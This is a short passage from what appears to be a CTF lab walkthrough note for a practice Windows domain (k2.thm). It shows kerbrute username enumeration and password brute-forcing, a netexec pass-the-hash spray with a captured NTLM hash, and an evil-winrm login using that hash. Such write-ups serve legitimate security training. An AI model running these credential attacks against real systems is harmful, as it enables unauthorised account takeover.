As you already have the adminstrator's hash you can test from that you obtained from [[Administrator's NTLM hash]].

#Attaking_Machine 

1. Add `Administrator` to `users.txt` file.
2. Use a tool called [Kerbute](https://github.com/ropnop/kerbrute) to validate any usernames.

```
 /home/kali/tools/kerbrute_linux_amd64 userenum --dc <target IP> -d k2.thm users.txt
```


![[kerbrute3.png]]

There are only two users: `Administrator` and `j.smith`.

2. Try the passwords that we have found prior.
```
/home/kali/tools/kerbrute_linux_amd64 bruteuser --dc <target IP>  -d k2.thm passwords.txt j.smith

```

![[passwords3.png]]

No luck. If you try with `administrator` user neither.

3. Try with the admininstrator's NTLM:

```
netexec smb k2.thm -u users.txt -H "9545b61858c043477c350ae86c37b32f" --continue-on-success
```

![[NETEXEC3.png]]

There'is a match. 


## Evil-WinRM

Try if you have WinRM access with the command:

```
evil-winrm -i k2.thm -u j.smith -H '9545b61858c043477c350ae86c37b32f'
```

![[winrm3 1.png]]

Nothing interesting in the Desktop directory of `j.smith`.

**Next step:** [[Shell as o.armstrong]]
